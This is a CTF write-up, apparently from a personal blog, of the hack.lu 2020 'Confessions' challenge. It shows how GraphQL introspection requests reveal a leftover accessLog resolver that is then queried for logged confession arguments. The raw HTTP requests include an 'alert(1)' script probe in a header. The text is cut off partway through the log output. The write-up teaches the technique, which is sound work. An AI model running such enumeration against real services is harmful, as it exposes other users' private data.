<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>emile.space</title>

  <style>
  * { word-wrap:break-word !important; font-family: monospace;
  margin: 0; padding: 0; }

/* light/darktheme specific foo */
@media (prefers-color-scheme: light) {
    html { background: #fff; color: #000; }
    a { color: #000; background: #fff; text-decoration: none;}
    a:not([href*="webring.xxiivv.com"]):hover, a:active { color: #fff; background: #000 }
    nav a:hover, a:active { color: #000; background: #fff }
    nav { margin: 1ex 0; background: #eee; }
    nav a { display:block; background: #eee; }
    h1 { margin: 3ex 0 1ex 0; width: 100%; background-color: #eee}
    h2 { margin: 2ex 0 1ex 0; width: 100%; background-color: #eee}
    h3 { margin: 1ex 0 1ex 0; width: 100%; /*background-color: #eee*/}
    .code { border-left: 1px solid #000; padding-left: 1ex; }
}
@media (prefers-color-scheme: dark) {
    html { background: #000; color: #fff; }
    a { color: #fff; background: #000; text-decoration: none; }
    a:not([href*="webring.xxiivv.com"]):hover, a:active { color: #000; background: #fff }
    nav a:hover, a:active { color: #fff; background: #000 }
    nav { margin: 1ex 0; background: #fff; }
    nav a { display:block; background: #fff; }
    h1 { margin: 3ex 0 1ex 0; width: 100%; background-color: #fff}
    h2 { margin: 2ex 0 1ex 0; width: 100%; background-color: #fff}
    h3 { margin: 1ex 0 1ex 0; width: 100%; /*background-color: #fff*/}
    .code { border-left: 1px solid #fff; padding-left: 1ex; }
    .webring { -webkit-filter: invert(100%); filter: invert(100%); }
}

/* settings for mobile devices*/
@media only screen and (max-width: 768px) {
  body { margin: 1ex; width: calc(100% - 2ex) !important; }
  img { max-width: 100% !important; max-height: 400px; }
}
img { max-width: 100ex; max-height: 400px; }

body { margin-left: auto; margin-right: auto; margin-top: 1ex; margin-bottom: 1ex; width: 100ex; }


.webring { align: right; }
a .webring { float: right; }

/* display local links using [] and external links using {} */
body pre a:not([href*="webring.xxiivv.com"]):before { content: "["; }
body pre a:not([href*="webring.xxiivv.com"]):after { content: "]"; }
a[href*="//"]:not([href*="emile.space"]):not([class*="icon"]):before {
  content: '{';
}
a[href*="//"]:not([href*="emile.space"]):not([class*="icon"]):after {
  content: '}';
}


ul { list-style-type: none; }

/* navigation bar magic */
nav * { color: #000; }
nav ul { list-style: none; position: relative; display: inline-block; }
nav ul li { display:inline-block; }
nav ul ul { display: none; position: absolute; border: 1px solid #000; background-color: #ff0; }
nav ul ul li { width: 100%; padding-right: 1ex; float:none; display:list-item; position: relative; }
nav + ul li { display: inline-block;}

/* only display the hover dropdown on non-mobile devices */
@media only screen and (min-width: 768px) {
  nav ul li:hover a + ul { display: inherit; white-space: nowrap; }
}

/* nav bar spacing char */
nav ul li > a::after { content: " /"; }
nav ul li > a:only-child::after { content: ""; }
nav ul li:last-of-type a::after { content: ""; }

h1 a, h2 a, h3 a { padding-right: 1ex; }

pre { white-space: pre-wrap; }

/* display the list of folders in the current one as a vertical list, if the
 * .vert class is present */
nav + ul.vert li { display: block; }

.w-100 { width: 100%; }


  </style>
</head>
    
<body>
  <header>
    <a href="/">emile.space</a>
  </header>
  <nav>
    <ul>
        <li>
            <a href="/ctf">ctf</a>
            <ul>
                <li><a href="/about">about/</a></li>
                <li><a href="/blog">blog/</a></li>
                <li><a href="/events">events/</a></li>
                <li><a href="/files">files/</a></li>
                <li><a href="/projects">projects/</a></li>
                <li><a href="/publications">publications/</a></li>
                <li><a href="/sport">sport/</a></li>
                <li><a href="/talks">talks/</a></li>
                <li><a href="/workshops">workshops/</a></li>
            </ul>
        </li>
        <li>
            <a href="/ctf/writeups">writeups</a>
            <ul>
                <li><a href="/ctf/hosted-events">hosted-events/</a></li>
                <li><a href="/ctf/resources">resources/</a></li>
                <li><a href="/ctf/teams">teams/</a></li>
            </ul>
        </li>
        <li>
            <a href="/ctf/writeups/2020">2020</a>
            <ul>
                <li><a href="/ctf/writeups/2019">2019/</a></li>
                <li><a href="/ctf/writeups/2021">2021/</a></li>
                <li><a href="/ctf/writeups/pwnable.kr">pwnable.kr/</a></li>
            </ul>
        </li>
        <li>
            <a href="/ctf/writeups/2020/hacklu">hacklu</a>
            <ul>
                <li><a href="/ctf/writeups/2020/nahamconCTF">nahamconCTF/</a></li>
                <li><a href="/ctf/writeups/2020/redpwnCTF">redpwnCTF/</a></li>
            </ul>
        </li>
        <li>
            <a href="/ctf/writeups/2020/hacklu/confessions">confessions</a>
            <ul>
            </ul>
        </li>
    </ul>
  </nav>
  <ul>
  </ul><pre></pre>
            <span id="confessions"></span>
            <h1><a href="#confessions">confessions</a></h1>
            <pre>
<a href="#confessions">confessions</a>
    <a href="#introduction">Introduction</a>
    <a href="#getting-started">Getting started</a>
    <a href="#initial-sourcecode-view">Initial sourcecode view</a>
    <a href="#initial-usage">Initial usage</a>
    <a href="#inspecting-the-sent-requests">Inspecting the sent requests</a>
    <a href="#playing-with-graphql">Playing with graphql</a>
       <a href="#getting-the-schema">Getting the schema</a>
       <a href="#getting-the-object-fields">Getting the object fields</a>
       <a href="#getting-the-types">Getting the types</a>
       <a href="#getting-all-access-logs">Getting all access logs</a>
    <a href="#extracting-the-message">Extracting the message</a>

</pre>
            <span id="introduction"></span>
            <h2><a href="#introduction">Introduction</a></h2>
            <pre>
This is a writeup for the "Confessions" challenge from the hacklu CTF. I consider this a great challenge, as it uses a technology, namely graphql, that isn't often used in most CTFs and due to me never having used it before required some searching, but not in an exaggerated way.

</pre>
            <span id="getting-started"></span>
            <h2><a href="#getting-started">Getting started</a></h2>
            <pre>
The start of all challenges: getting to know the challenge. In this case, the first thing we see is a pink page:

<img src="first_impression.png">

The functionality this page provides can be described as follows: You enter a title and a message, then receive a hash. You can post this hash anywhere and then, sometime in the future post a link containing the message.

This concept allows proving that you've got something afterwards. For example, I used such a concept in the nahamcon-CTF to prove my <a href="/ctf/writeups/2020/nahamconCTF/complete-flag-leak/">complete flagleak</a>. Overall, this allows proving that some information was accessible at some given time.

</pre>
            <span id="initial-sourcecode-view"></span>
            <h2><a href="#initial-sourcecode-view">Initial sourcecode view</a></h2>
            <pre>
After slightly inspecting the page, the next step would be to look into the page source:

</pre><pre class="code">&lt!doctype html></pre><pre>
</pre><pre class="code">&lthtml></pre><pre>
</pre><pre class="code">    &lthead></pre><pre>
</pre><pre class="code">        &ltmeta charset="utf-8"></pre><pre>
</pre><pre class="code">        &lttitle>Confessions ðŸ’•&lt/title></pre><pre>
</pre><pre class="code">        &ltlink rel="stylesheet" href="confessions.css"></pre><pre>
</pre><pre class="code">    &lt/head></pre><pre>
</pre><pre class="code">    &ltbody></pre><pre>
</pre><pre class="code">        &lth1></pre><pre>
</pre><pre class="code">            &lta href="/">Confessions&lt/a></pre><pre>
</pre><pre class="code">            ðŸ’•</pre><pre>
</pre><pre class="code">        &lt/h1></pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">        &ltdiv id="input"></pre><pre>
</pre><pre class="code">            &ltdiv class="description"></pre><pre>
</pre><pre class="code">                Ever wanted to prove that you knew some secret without</pre><pre>
</pre><pre class="code">                revealing it right away?</pre><pre>
</pre><pre class="code">                &ltbr>&ltbr></pre><pre>
</pre><pre class="code">                You can confess your deepest secrets here!</pre><pre>
</pre><pre class="code">                Send the hash to anyone or post it.</pre><pre>
</pre><pre class="code">                When you want to reveal the secret, just give them the link.</pre><pre>
</pre><pre class="code">                They can then check that the hash matches the message,</pre><pre>
</pre><pre class="code">                so they know that you knew that secret message when you</pre><pre>
</pre><pre class="code">                published the hash!</pre><pre>
</pre><pre class="code">            &lt/div></pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">            &ltinput id="title" placeholder="Title"></pre><pre>
</pre><pre class="code">            &lttextarea id="message" placeholder="Enter your confession here...">&lt/textarea></pre><pre>
</pre><pre class="code">            &ltbutton id="publish">Publish&lt/button></pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">            &lth3>Preview:&lt/h3></pre><pre>
</pre><pre class="code">        &lt/div></pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">        &ltdiv id="preview" class="confession"></pre><pre>
</pre><pre class="code">            &lth4 class="title">&lt;title&gt;&lt/h4></pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">            &ltdiv class="label">Hash&lt/div></pre><pre>
</pre><pre class="code">            &ltdiv class="hash">&lt;hash&gt;&lt/div></pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">            &ltdiv class="label">Message&lt/div></pre><pre>
</pre><pre class="code">            &ltdiv class="message">&lt;message&gt;&lt/div></pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">            &ltdiv class="label">How to verify&lt/div></pre><pre>
</pre><pre class="code">            &ltdiv class="how-to-verify">&lt;how to verify&gt;&lt/div></pre><pre>
</pre><pre class="code">        &lt/div></pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">        &ltscript src="confessions.js">&lt/script></pre><pre>
</pre><pre class="code">    &lt/body></pre><pre>
</pre><pre class="code">&lt/html></pre><pre>


The page doesn't consist of much, there's some static html content, some css and some javascript. The static content doesn't do anything, so lets don't even bother into looking into it. The interesting part is the javascript, in this case, the confessions.js file. Let's go through it block by block:

The part below "talks with the GraphQL endpoint", so it communicates with the GraphQL system in the backend sending a JSON body containing the operation name (hardcoded to null), a query (more regarding that in the next block) and variables to the backend. It then reads the response and returns the response data.


</pre><pre class="code">// talk to the GraphQL endpoint</pre><pre>
</pre><pre class="code">const gql = async (query, variables={}) => {</pre><pre>
</pre><pre class="code">    let response = await fetch('/graphql', {</pre><pre>
</pre><pre class="code">        method: 'POST',</pre><pre>
</pre><pre class="code">        headers: {</pre><pre>
</pre><pre class="code">            'content-type': 'application/json',</pre><pre>
</pre><pre class="code">        },</pre><pre>
</pre><pre class="code">        body: JSON.stringify({</pre><pre>
</pre><pre class="code">            operationName: null,</pre><pre>
</pre><pre class="code">            query,</pre><pre>
</pre><pre class="code">            variables,</pre><pre>
</pre><pre class="code">        }),</pre><pre>
</pre><pre class="code">    });</pre><pre>
</pre><pre class="code">    let json = await response.json();</pre><pre>
</pre><pre class="code">    if (json.errors && json.errors.length) {</pre><pre>
</pre><pre class="code">        throw json.errors;</pre><pre>
</pre><pre class="code">    } else {</pre><pre>
</pre><pre class="code">        return json.data;</pre><pre>
</pre><pre class="code">    }</pre><pre>
</pre><pre class="code">};</pre><pre>


This block below defines the queries sent to the backend, these are used in the code above when sent to the backend. More on them later on.


</pre><pre class="code">// some queries/mutations</pre><pre>
</pre><pre class="code">const getConfession = async hash => gql('query Q($hash: String) { confession(hash: $hash) { title, hash } }', { hash }).then(d => d.confession);</pre><pre>
</pre><pre class="code">const getConfessionWithMessage = async id => gql('mutation Q($id: String) { confessionWithMessage(id: $id) { title, hash, message } }', { id }).then(d => d.confessionWithMessage);</pre><pre>
</pre><pre class="code">const addConfession = async (title, message) => gql('mutation M($title: String, $message: String) { addConfession(title: $title, message: $message) { id } }', { title, message }).then(d => d.addConfession);</pre><pre>
</pre><pre class="code">const previewHash = async (title, message) => gql('mutation M($title: String, $message: String) { addConfession(title: $title, message: $message) { hash } }', { title, message }).then(d => d.addConfession);</pre><pre>
</pre><pre class="code">The next block is just a misleading comment, as this is just random foo not relevant in any way.</pre><pre>


</pre><pre class="code">// the important elements</pre><pre>
</pre><pre class="code">const title = document.querySelector('#title');</pre><pre>
</pre><pre class="code">const message = document.querySelector('#message');</pre><pre>
</pre><pre class="code">const publish = document.querySelector('#publish');</pre><pre>
</pre><pre class="code">const preview = document.querySelector('#preview');</pre><pre>
</pre><pre class="code">The block below renders a given confession. Nothing of interest here.</pre><pre>


</pre><pre class="code">// render a confession</pre><pre>
</pre><pre class="code">const show = async confession => {</pre><pre>
</pre><pre class="code">    if (confession) {</pre><pre>
</pre><pre class="code">        preview.querySelector('.title').textContent = confession.title || '&lttitle>';</pre><pre>
</pre><pre class="code">        preview.querySelector('.hash').textContent = confession.hash || '&lthash>';</pre><pre>
</pre><pre class="code">        preview.querySelector('.message').textContent = confession.message || '&ltmessage>';</pre><pre>
</pre><pre class="code">        preview.querySelector('.how-to-verify').textContent = `sha256(${JSON.stringify(confession.message || '')})`;</pre><pre>
</pre><pre class="code">    } else {</pre><pre>
</pre><pre class="code">        preview.innerHTML = '&ltem>Not found :(&lt/em>';</pre><pre>
</pre><pre class="code">    }</pre><pre>
</pre><pre class="code">};</pre><pre>


And the next block updates the preview.


</pre><pre class="code">// update the confession preview</pre><pre>
</pre><pre class="code">const update = async () => {</pre><pre>
</pre><pre class="code">    let { hash } = await previewHash(title.value, message.value);</pre><pre>
</pre><pre class="code">    let confession = await getConfession(hash);</pre><pre>
</pre><pre class="code">    await show({</pre><pre>
</pre><pre class="code">        ...confession,</pre><pre>
</pre><pre class="code">        message: message.value,</pre><pre>
</pre><pre class="code">    });</pre><pre>
</pre><pre class="code">};</pre><pre>
</pre><pre class="code">title.oninput = update;</pre><pre>
</pre><pre class="code">message.oninput = update;</pre><pre>


This block publishes the confession, it adds the confession to the backend and uses the given id to redirect to the url with the appended id that is used.


</pre><pre class="code">// publish a confession</pre><pre>
</pre><pre class="code">publish.onclick = async () => {</pre><pre>
</pre><pre class="code">    title.disabled = true;</pre><pre>
</pre><pre class="code">    message.disabled = true;</pre><pre>
</pre><pre class="code">    publish.disabled = true;</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">    let { id } = await addConfession(title.value, message.value);</pre><pre>
</pre><pre class="code">    location.href = `#${id}`;</pre><pre>
</pre><pre class="code">    location.reload();</pre><pre>
</pre><pre class="code">};</pre><pre>


This block uses the confession id given in the url and displays that confession.


</pre><pre class="code">// show a confession when one is given in the location hash</pre><pre>
</pre><pre class="code">if (location.hash) {</pre><pre>
</pre><pre class="code">    let id = location.hash.slice(1);</pre><pre>
</pre><pre class="code">    document.querySelector('#input').remove();</pre><pre>
</pre><pre class="code">    getConfessionWithMessage(id).then(show).catch(() => document.write('F'));</pre><pre>
</pre><pre class="code">}</pre><pre>


Now after having some basic understanding of what this javascript does, we need a better understanding of how this actually works, as in: what can we do?, what can we break?

</pre>
            <span id="initial-usage"></span>
            <h2><a href="#initial-usage">Initial usage</a></h2>
            <pre>
Well, we can insert a title and a message. While entering this, we get a live preview of the hash. If we look into the requests sent while typing, we see the following:

<img src="./lots_of_requests.png">

...lots and lots of requests to the /graphql endpoint. Thus our next task is born: looking into these requests.

</pre>
            <span id="inspecting-the-sent-requests"></span>
            <h2><a href="#inspecting-the-sent-requests">Inspecting the sent requests</a></h2>
            <pre>
The requests sent while entering stuff look like this:


</pre><pre class="code">POST /graphql HTTP/1.1</pre><pre>
</pre><pre class="code">Host: confessions.flu.xxx</pre><pre>
</pre><pre class="code">User-Agent: alert(1)</pre><pre>
</pre><pre class="code">Accept: */*</pre><pre>
</pre><pre class="code">Accept-Language: en-US,en;q=0.5</pre><pre>
</pre><pre class="code">Accept-Encoding: gzip, deflate</pre><pre>
</pre><pre class="code">Referer: https://confessions.flu.xxx/</pre><pre>
</pre><pre class="code">content-type: application/json</pre><pre>
</pre><pre class="code">Origin: https://confessions.flu.xxx</pre><pre>
</pre><pre class="code">Content-Length: 187</pre><pre>
</pre><pre class="code">Connection: close</pre><pre>
</pre><pre class="code">Cookie: session=s%3A9wDzGivuPGi2__m1CaDR5rRuZw_DN4m1.htC5hdkX0sr4eYWb9CdTRidgXDQrBYRfpUQ28hIhOgI</pre><pre>
</pre><pre class="code">Pragma: no-cache</pre><pre>
</pre><pre class="code">Cache-Control: no-cache</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "operationName": null,</pre><pre>
</pre><pre class="code">  "query": "query Q($hash: String) { confession(hash: $hash) { title, hash } }",</pre><pre>
</pre><pre class="code">  "variables": {</pre><pre>
</pre><pre class="code">    "hash": "014c3d0b13f6bc2d05dd32139a2178f17b1fe08ae5755882e9049817377f3c61"</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>


The interesting part here is the query, so from here on, I won't insert all headers into all requests.

</pre>
            <span id="playing-with-graphql"></span>
            <h2><a href="#playing-with-graphql">Playing with graphql</a></h2>
            <pre>
The <a href="https://graphql.org/">GraphQL</a> documentation has a <a href="https://graphql.org/learn/">great learning section</a>, I used this to learn the basics used further down.

</pre>
            <span id="getting-the-schema"></span>
            <h3><a href="#getting-the-schema">Getting the schema</a></h3>
            <pre>
One of the first things I tried, was getting the schema used. this can be done using <a href="https://graphql.org/learn/introspection/">graphql introspection</a>:


</pre><pre class="code">POST /graphql HTTP/1.1</pre><pre>
</pre><pre class="code">Host: confessions.flu.xxx</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">...</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">Cookie: session=s%3A9wDzGivuPGi2__m1CaDR5rRuZw_DN4m1.htC5hdkX0sr4eYWb9CdTRidgXDQrBYRfpUQ28hIhOgI</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "operationName": null,</pre><pre>
</pre><pre class="code">  "query": "{__schema {types{name}}}",</pre><pre>
</pre><pre class="code">  "variables": {</pre><pre>
</pre><pre class="code">    "hash": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "data": {</pre><pre>
</pre><pre class="code">    "__schema": {</pre><pre>
</pre><pre class="code">      "types": [</pre><pre>
</pre><pre class="code">        {</pre><pre>
</pre><pre class="code">          "name": "Query"</pre><pre>
</pre><pre class="code">        },</pre><pre>
</pre><pre class="code">        {</pre><pre>
</pre><pre class="code">          "name": "Access"</pre><pre>
</pre><pre class="code">        },</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">		...</pre><pre>
</pre><pre class="code"></pre><pre>
</pre><pre class="code">        {</pre><pre>
</pre><pre class="code">          "name": "Int"</pre><pre>
</pre><pre class="code">        }</pre><pre>
</pre><pre class="code">      ]</pre><pre>
</pre><pre class="code">    }</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>


here all the "name" values:


</pre><pre class="code">"Query"</pre><pre>
</pre><pre class="code">"Access"</pre><pre>
</pre><pre class="code">"String"</pre><pre>
</pre><pre class="code">"Confession"</pre><pre>
</pre><pre class="code">"Mutation"</pre><pre>
</pre><pre class="code">"__Schema"</pre><pre>
</pre><pre class="code">"__Type"</pre><pre>
</pre><pre class="code">"__TypeKind"</pre><pre>
</pre><pre class="code">"Boolean"</pre><pre>
</pre><pre class="code">"__Field"</pre><pre>
</pre><pre class="code">"__InputValue"</pre><pre>
</pre><pre class="code">"__EnumValue"</pre><pre>
</pre><pre class="code">"__Directive"</pre><pre>
</pre><pre class="code">"__DirectiveLocation"</pre><pre>
</pre><pre class="code">"CacheControlScope"</pre><pre>
</pre><pre class="code">"Upload"</pre><pre>
</pre><pre class="code">"Int"</pre><pre>


</pre>
            <span id="getting-the-object-fields"></span>
            <h3><a href="#getting-the-object-fields">Getting the object fields</a></h3>
            <pre>
With the schema information acquired, we can get the fields for the objects:


</pre><pre class="code">POST /graphql HTTP/1.1</pre><pre>
</pre><pre class="code">Host: confessions.flu.xxx</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">...</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">Cookie: session=s%3A9wDzGivuPGi2__m1CaDR5rRuZw_DN4m1.htC5hdkX0sr4eYWb9CdTRidgXDQrBYRfpUQ28hIhOgI</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "operationName": null,</pre><pre>
</pre><pre class="code">  "query": "{__type(name: \"Confession\") {name, fields { name } }}",</pre><pre>
</pre><pre class="code">  "variables": {</pre><pre>
</pre><pre class="code">    "hash": "Confession"</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "data": {</pre><pre>
</pre><pre class="code">    "__type": {</pre><pre>
</pre><pre class="code">      "name": "Confession",</pre><pre>
</pre><pre class="code">      "fields": [</pre><pre>
</pre><pre class="code">        {</pre><pre>
</pre><pre class="code">          "name": "id"</pre><pre>
</pre><pre class="code">        },</pre><pre>
</pre><pre class="code">        {</pre><pre>
</pre><pre class="code">          "name": "title"</pre><pre>
</pre><pre class="code">        },</pre><pre>
</pre><pre class="code">        {</pre><pre>
</pre><pre class="code">          "name": "hash"</pre><pre>
</pre><pre class="code">        },</pre><pre>
</pre><pre class="code">        {</pre><pre>
</pre><pre class="code">          "name": "message"</pre><pre>
</pre><pre class="code">        }</pre><pre>
</pre><pre class="code">      ]</pre><pre>
</pre><pre class="code">    }</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>


We've already got this information: we can extract if from the queries defined in the javascript, but never the less, It's nice to know that there aren't more fields that we're possibly overlooking.


</pre>
            <span id="getting-the-types"></span>
            <h3><a href="#getting-the-types">Getting the types</a></h3>
            <pre>

When listing all types in the schema, we get an interesting result:


</pre><pre class="code">POST /graphql HTTP/1.1</pre><pre>
</pre><pre class="code">Host: confessions.flu.xxx</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">...</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">Cookie: session=s%3A9wDzGivuPGi2__m1CaDR5rRuZw_DN4m1.htC5hdkX0sr4eYWb9CdTRidgXDQrBYRfpUQ28hIhOgI</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "operationName": null,</pre><pre>
</pre><pre class="code">  "query": "{__schema {queryType{fields{name, description}}}}",</pre><pre>
</pre><pre class="code">  "variables": {</pre><pre>
</pre><pre class="code">    "hash": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "data": {</pre><pre>
</pre><pre class="code">    "__schema": {</pre><pre>
</pre><pre class="code">      "queryType": {</pre><pre>
</pre><pre class="code">        "fields": [</pre><pre>
</pre><pre class="code">          {</pre><pre>
</pre><pre class="code">            "name": "accessLog",</pre><pre>
</pre><pre class="code">            "description": "Show the resolver access log. TODO: remove before production release"</pre><pre>
</pre><pre class="code">          },</pre><pre>
</pre><pre class="code">          {</pre><pre>
</pre><pre class="code">            "name": "confession",</pre><pre>
</pre><pre class="code">            "description": "Get a confession by its hash. Does not contain confidential data."</pre><pre>
</pre><pre class="code">          }</pre><pre>
</pre><pre class="code">        ]</pre><pre>
</pre><pre class="code">      }</pre><pre>
</pre><pre class="code">    }</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>


The "accessLog" contains a description hinting that this should be removed before taking the application into production.

</pre>
            <span id="getting-all-access-logs"></span>
            <h3><a href="#getting-all-access-logs">Getting all access logs</a></h3>
            <pre>
As the "accessLog" should not be in production, there seems to be an error that is somehow critical. Thus, getting the accessLog seems like a logical next step. In order to get the accessLog, we first need to get the name of the fields in the accessLog, as we want to fetch all fields.


</pre><pre class="code">POST /graphql HTTP/1.1</pre><pre>
</pre><pre class="code">Host: confessions.flu.xxx</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">...</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">Cookie: session=s%3A9wDzGivuPGi2__m1CaDR5rRuZw_DN4m1.htC5hdkX0sr4eYWb9CdTRidgXDQrBYRfpUQ28hIhOgI</pre><pre>
</pre><pre class="code">Cache-Control: no-cache</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "operationName": null,</pre><pre>
</pre><pre class="code">  "query": "{__type(name: \"Access\"){name, kind, fields{name, description, type{name, kind, description}}}}",</pre><pre>
</pre><pre class="code">  "variables": {</pre><pre>
</pre><pre class="code">    "id": "40dbcdf5-31ec-428a-a42e-ec2f75452efe"</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "data": {</pre><pre>
</pre><pre class="code">    "__type": {</pre><pre>
</pre><pre class="code">      "name": "Access",</pre><pre>
</pre><pre class="code">      "kind": "OBJECT",</pre><pre>
</pre><pre class="code">      "fields": [</pre><pre>
</pre><pre class="code">        {</pre><pre>
</pre><pre class="code">          "name": "timestamp",</pre><pre>
</pre><pre class="code">          "description": "",</pre><pre>
</pre><pre class="code">          "type": {</pre><pre>
</pre><pre class="code">            "name": "String",</pre><pre>
</pre><pre class="code">            "kind": "SCALAR",</pre><pre>
</pre><pre class="code">            "description": "The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text."</pre><pre>
</pre><pre class="code">          }</pre><pre>
</pre><pre class="code">        },</pre><pre>
</pre><pre class="code">        {</pre><pre>
</pre><pre class="code">          "name": "name",</pre><pre>
</pre><pre class="code">          "description": "",</pre><pre>
</pre><pre class="code">          "type": {</pre><pre>
</pre><pre class="code">            "name": "String",</pre><pre>
</pre><pre class="code">            "kind": "SCALAR",</pre><pre>
</pre><pre class="code">            "description": "The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text."</pre><pre>
</pre><pre class="code">          }</pre><pre>
</pre><pre class="code">        },</pre><pre>
</pre><pre class="code">        {</pre><pre>
</pre><pre class="code">          "name": "args",</pre><pre>
</pre><pre class="code">          "description": "",</pre><pre>
</pre><pre class="code">          "type": {</pre><pre>
</pre><pre class="code">            "name": "String",</pre><pre>
</pre><pre class="code">            "kind": "SCALAR",</pre><pre>
</pre><pre class="code">            "description": "The `String` scalar type represents textual data, represented as UTF-8 character sequences. The String type is most often used by GraphQL to represent free-form human-readable text."</pre><pre>
</pre><pre class="code">          }</pre><pre>
</pre><pre class="code">        }</pre><pre>
</pre><pre class="code">      ]</pre><pre>
</pre><pre class="code">    }</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>


As you can see, there are three fields: "timestamp", "name" and "args". With this information, we can now fetch the access log:


</pre><pre class="code">POST /graphql HTTP/1.1</pre><pre>
</pre><pre class="code">Host: confessions.flu.xxx</pre><pre>
</pre><pre class="code">Cookie: session=s%3A9wDzGivuPGi2__m1CaDR5rRuZw_DN4m1.htC5hdkX0sr4eYWb9CdTRidgXDQrBYRfpUQ28hIhOgI</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "operationName": null,</pre><pre>
</pre><pre class="code">  "query": "{accessLog{timestamp, name, args}}",</pre><pre>
</pre><pre class="code">  "variables": {</pre><pre>
</pre><pre class="code">    "id": "40dbcdf5-31ec-428a-a42e-ec2f75452efe"</pre><pre>
</pre><pre class="code">  }</pre><pre>
</pre><pre class="code">}</pre><pre>
</pre><pre class="code"> </pre><pre>
</pre><pre class="code">{</pre><pre>
</pre><pre class="code">  "data": {</pre><pre>
</pre><pre class="code">    "accessLog": [</pre><pre>
</pre><pre class="code">      {</pre><pre>
</pre><pre class="code">        "timestamp": "Fri Oct 23 2020 01:46:56 GMT+0000 (Coordinated Universal Time)",</pre><pre>
</pre><pre class="code">        "name": "addConfession",</pre><pre>
</pre><pre class="code">        "args": "{\"title\":\"&ltredacted>\",\"message\":\"&ltredacted>\"}"</pre><pre>
</pre><pre class="code">      },</pre><pre>
</pre><pre class="code">      {</pre><pre>
</pre><pre class="code">        "timestamp": "Fri Oct 23 2020 01:46:56 GMT+0000 (Coordinated Universal Time)",</pre><pre>
</pre><pre class="code">        "name": "confession",</pre><pre>
</pre><pre class="code">        "args": "{\"hash\":\"252f10c83610ebca1a059c0bae8255eba2f95be4d1d7bcfa89d7248a82d9f111\"}"</pre><pre>
</pre><pre class="code">      },</pre><pre>
</pre><pre class="code">      {</pre><pre>
</pre><pre class="code">        "timestamp": "Fri Oct 23 2020 01:46:57 GMT+0000 (Coordinated Universal Time)",</pre><pre>
</pre><pre class="code">        "name": "addConfession",</pre><pre>
</pre><pre class="code">        "args": "{\"title\":\"&ltredacted>\",\"message\":\"&ltredacted>\"}"</pre><pre>
</pre><pre class="code">      },</pre><pre>
</pre><pre class="code">      {</pre><pre>
</pre><pre class="code">        "timestamp": "Fri Oct 23 2020 01:46:57 GMT+0000 (Coordinated Universal Time)",</pre><pre>
</pre><pre class="code">        "name": "confession",</pre><pre>
</pre><pre class="code">        "args": "{\"hash\":\"593f2d04aab251f60c9e4b8bbc1e05a34e920980ec08351a18459b2bc7dbf2f6\"}"</pre><pre>
</pre><pre class="code">      },</pre><pre>
</pre><pre class="code">      {</pre><pre>
</pre><pre class="code">        "timestamp": "Fri Oct 23 2020 01:46:58 GMT+0000 (Coordinated Universal Time)",</pre><pre>
</pre><pre class="code">        "name": "addConfession",</pre><pre>
</pre><pre class="code">        "args": "{\"title\":\"&ltredacted>\",\"message\":\"&ltredacted>\"}"</pre><pre>
</pre><pre class="code">      },</pre><pre>
</pre><pre class="code">      {</pre><pre>
